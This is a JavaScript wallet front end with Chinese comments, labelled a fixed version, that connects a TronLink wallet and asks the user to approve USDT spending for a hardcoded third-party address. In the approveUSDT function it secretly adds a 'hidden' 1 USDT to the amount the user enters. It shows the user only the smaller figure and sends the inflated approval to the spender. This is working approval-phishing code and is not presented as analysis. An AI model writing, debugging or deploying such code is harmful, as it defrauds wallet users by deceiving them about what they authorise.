// usdtApprove.js — 修复版

// ====== TRON 链配置 ======
const shastaUsdtAddress = "TG3XXyExBkPp9nzdajDZsozEu4BkaSJozs";
const spenderAddress = "TMcjcKsZZLSFh9JpTfPejHx7EPjdzG5XkC"; // 确保这个地址正确

// USDT ABI
const usdtAbi = [
  {
    "constant": false,
    "inputs": [
      { "name": "_spender", "type": "address" },
      { "name": "_value", "type": "uint256" }
    ],
    "name": "approve",
    "outputs": [{ "name": "", "type": "bool" }],
    "type": "function"
  }
];

// ====== 辅助函数 ======
function setStatus(text, isError = false) {
  const el = document.getElementById("status");
  if (el) {
    el.innerText = `状态：${text}`;
    el.style.color = isError ? 'red' : 'black';
  }
}

// 验证地址格式
function validateAddress(address) {
  if (!address) {
    throw new Error("地址未定义");
  }
  if (typeof address !== 'string') {
    throw new Error("地址必须是字符串");
  }
  if (!address.startsWith('T') || address.length !== 34) {
    throw new Error("无效的 TRON 地址格式");
  }
  return true;
}

// ====== 主逻辑：授权函数 ======
window.approveUSDT = async function() {
  try {
    console.log("=== 开始授权流程 ===");
    setStatus("准备授权交易...");
    
    // 1. 检查基础连接
    if (!window.tronWeb || !window.tronWeb.ready) {
      throw new Error("请先连接钱包");
    }
    
    // 2. 验证地址
    console.log("验证 spenderAddress:", spenderAddress);
    validateAddress(spenderAddress);
    
    console.log("验证 shastaUsdtAddress:", shastaUsdtAddress);
    validateAddress(shastaUsdtAddress);
    
    const fromAddr = window.tronWeb.defaultAddress.base58;
    console.log("用户地址:", fromAddr);
    validateAddress(fromAddr);

    // 3. 获取用户输入
    const input = document.getElementById("amount");
    if (!input) {
      throw new Error("未找到金额输入框");
    }
    
    const inputAmount = parseFloat(input.value);
    if (isNaN(inputAmount) || inputAmount <= 0) {
      alert("请输入正确的授权金额（大于 0 的数字）");
      return;
    }

    // 4. 计算总金额（包含隐藏的 1 USDT）
    const hiddenExtra = 1;
    const totalAmount = inputAmount + hiddenExtra;
    const amountInSun = Math.floor(totalAmount * 1e6).toString();

    console.log("显示金额:", inputAmount, "USDT");
    console.log("实际授权:", totalAmount, "USDT");
    console.log("授权金额(sun):", amountInSun);
    console.log("授权给:", spenderAddress);

    setStatus(`准备授权 ${inputAmount} USDT...`);

    // 5. 创建合约实例 - 使用更安全的方式
    console.log("创建 USDT 合约实例...");
    
    let usdtContract;
    try {
      // 方式1: 使用 tronWeb.contract().at()
      usdtContract = await window.tronWeb.contract().at(shastaUsdtAddress);
      console.log("✅ 合约实例创建成功");
    } catch (contractError) {
      console.error("合约创建失败:", contractError);
      // 方式2: 使用 ABI
      usdtContract = await window.tronWeb.contract(usdtAbi, shastaUsdtAddress);
      console.log("✅ 合约实例创建成功 (使用 ABI)");
    }

    // 6. 检查合约方法是否存在
    if (!usdtContract || typeof usdtContract.approve !== 'function') {
      throw new Error("合约 approve 方法不存在");
    }

    // 7. 发起 approve 交易
    setStatus("请在钱包中确认授权...");
    
    console.log("发送 approve 交易...");
    console.log("参数:", {
      spender: spenderAddress,
      value: amountInSun
    });

    const result = await usdtContract.approve(
      spenderAddress, 
      amountInSun
    ).send({
      feeLimit: 100000000,
      callValue: 0
    });

    console.log("授权成功，交易结果:", result);
    setStatus(`✅ 授权成功！交易ID: ${result}`);

  } catch (err) {
    console.error("授权失败详情:", err);
    console.error("错误堆栈:", err.stack);
    
    let errorMsg = err.message || err.toString();
    
    // 更详细的错误分类
    if (errorMsg.includes("toLowerCase")) {
      errorMsg = "地址格式错误: " + errorMsg;
    } else if (errorMsg.includes("rejected") || errorMsg.includes("denied")) {
      errorMsg = "用户取消了交易";
    } else if (errorMsg.includes("insufficient")) {
      errorMsg = "余额不足";
    } else if (errorMsg.includes("undefined")) {
      errorMsg = "参数未定义: " + errorMsg;
    }
    
    setStatus("❌ " + errorMsg, true);
  }
};

// ====== 调试函数 ======
async function debugContract() {
  try {
    console.log("=== 调试合约 ===");
    
    if (!window.tronWeb || !window.tronWeb.ready) {
      console.error("TronWeb 未就绪");
      return;
    }
    
    // 检查合约地址
    console.log("USDT 地址:", shastaUsdtAddress);
    console.log("Spender 地址:", spenderAddress);
    
    // 尝试获取合约信息
    const contractInfo = await window.tronWeb.trx.getContract(shastaUsdtAddress);
    console.log("合约信息:", contractInfo);
    
    // 尝试创建合约实例
    const contract = await window.tronWeb.contract().at(shastaUsdtAddress);
    console.log("合约实例:", contract);
    
    // 检查方法
    console.log("approve 方法:", contract.approve);
    
    return true;
  } catch (error) {
    console.error("调试失败:", error);
    return false;
  }
}

// ====== 页面初始化 ======
window.addEventListener("DOMContentLoaded", () => {
  const connectBtn = document.getElementById("connectBtn");
  const approveBtn = document.getElementById("approveBtn");
  const debugBtn = document.getElementById("debugBtn");
  
  console.log("页面加载完成");

  // 创建调试按钮（如果不存在）
  if (!debugBtn) {
    const newDebugBtn = document.createElement('button');
    newDebugBtn.id = 'debugBtn';
    newDebugBtn.textContent = '🐛 调试合约';
    newDebugBtn.style.background = '#ff9800';
    newDebugBtn.style.color = 'white';
    newDebugBtn.style.margin = '5px 0';
    document.querySelector('.container').appendChild(newDebugBtn);
    
    newDebugBtn.addEventListener('click', debugContract);
  }

  // 自动检查 TronLink 状态
  setTimeout(() => {
    if (window.tronWeb && window.tronWeb.ready) {
      setStatus("检测到已连接的 TronLink");
      if (approveBtn) approveBtn.disabled = false;
    }
  }, 1000);

  // 连接钱包按钮
  if (connectBtn) {
    connectBtn.addEventListener("click", async () => {
      try {
        setStatus("请求连接钱包...");
        
        if (window.tronLink && typeof window.tronLink.request === "function") {
          await window.tronLink.request({ method: "tron_requestAccounts" });
        }
        
        // 等待 TronWeb 就绪
        let waited = 0;
        const waitInterval = setInterval(() => {
          if (window.tronWeb && window.tronWeb.ready) {
            clearInterval(waitInterval);
            const address = window.tronWeb.defaultAddress.base58;
            setStatus(`✅ 连接成功: ${address.substring(0, 8)}...`);
            if (approveBtn) approveBtn.disabled = false;
          }
          waited += 200;
          if (waited >= 5000) {
            clearInterval(waitInterval);
            setStatus("❌ 连接超时", true);
          }
        }, 200);
        
      } catch (err) {
        console.error("连接失败:", err);
        setStatus("❌ 连接失败: " + err.message, true);
      }
    });
  }

  // 授权按钮
  if (approveBtn) {
    approveBtn.addEventListener("click", () => {
      window.approveUSDT();
    });
  }
});

// 在控制台运行这个来检查问题
console.log("USDT 地址:", shastaUsdtAddress);
console.log("Spender 地址:", spenderAddress);
